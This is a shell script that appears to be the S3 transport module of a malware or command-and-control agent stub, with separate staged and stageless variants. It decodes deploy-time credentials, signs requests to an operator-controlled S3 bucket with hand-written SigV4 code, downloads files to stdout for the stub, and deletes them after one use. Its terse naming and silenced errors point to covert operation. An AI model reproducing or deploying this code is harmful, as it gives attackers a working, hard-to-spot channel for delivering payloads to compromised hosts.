# === TRANSPORT: AWS S3 (stub layer) ===
# Provides _tk (ready signal), _dl (download), _rm (delete) with Sig V4 signing.
# No OAuth token — each request is signed inline with HMAC-SHA256 via openssl.
# Credentials substituted by wizard at deploy time.
# This file is prepended to agent/stub.sh and agent/stub_stageless.sh.

_ak=$(printf '%s' 'STUB_ACCESS_KEY_ID_B64'     | base64 -d 2>/dev/null)
_sk=$(printf '%s' 'STUB_SECRET_ACCESS_KEY_B64'  | base64 -d 2>/dev/null)
_sr=$(printf '%s' 'STUB_S3_REGION_B64'           | base64 -d 2>/dev/null)
_sb=$(printf '%s' 'STUB_S3_BUCKET_B64'           | base64 -d 2>/dev/null)
_sh="${_sb}.s3.${_sr}.amazonaws.com"
_su="https://${_sh}"
_eh='e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'

_hm() { printf '%s' "$2" | openssl dgst -sha256 -mac HMAC -macopt "hexkey:$1" 2>/dev/null | awk '{print $NF}'; }
_hs() { printf '%s' "$1" | openssl dgst -sha256 -hex 2>/dev/null | awk '{print $NF}'; }

_s4k() {
    local _d="$1" _k0 _k1 _k2
    _k0=$(printf '%s' "$_d" | openssl dgst -sha256 -mac HMAC \
            -macopt "key:AWS4${_sk}" 2>/dev/null | awk '{print $NF}')
    _k1=$(_hm "$_k0" "$_sr")
    _k2=$(_hm "$_k1" "s3")
    _hm "$_k2" "aws4_request"
}

_s4() {
    local _m="$1" _k="${2#/}" _ph="$3" _dt _date _scope _cr _sts
    _dt=$(date -u +%Y%m%dT%H%M%SZ)
    _date="${_dt:0:8}"
    _scope="${_date}/${_sr}/s3/aws4_request"
    _cr="${_m}
/${_k}

host:${_sh}
x-amz-content-sha256:${_ph}
x-amz-date:${_dt}

host;x-amz-content-sha256;x-amz-date
${_ph}"
    _sts=$(printf 'AWS4-HMAC-SHA256\n%s\n%s\n%s' "$_dt" "$_scope" "$(_hs "$_cr")")
    _S4A="AWS4-HMAC-SHA256 Credential=${_ak}/${_scope}, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=$(_hm "$(_s4k "$_date")" "$_sts")"
    _S4D="$_dt"
}

# -- transport ready signal (S3 has no OAuth token) --
_tk() { printf 'ok'; }

# -- download file to stdout --
_dl() {
    local _path="$2"
    _s4 GET "$_path" "$_eh"
    curl -sf --connect-timeout 10 --max-time 30 \
        "${_su}/${_path#/}" \
        -H "Authorization: ${_S4A}" \
        -H "X-Amz-Date: ${_S4D}" \
        -H "X-Amz-Content-Sha256: ${_eh}" 2>/dev/null
}

# -- delete file (BK one-time use) --
_rm() {
    local _path="$2"
    _s4 DELETE "$_path" "$_eh"
    curl -sf --connect-timeout 10 --max-time 15 \
        -X DELETE "${_su}/${_path#/}" \
        -H "Authorization: ${_S4A}" \
        -H "X-Amz-Date: ${_S4D}" \
        -H "X-Amz-Content-Sha256: ${_eh}" >/dev/null 2>&1
}
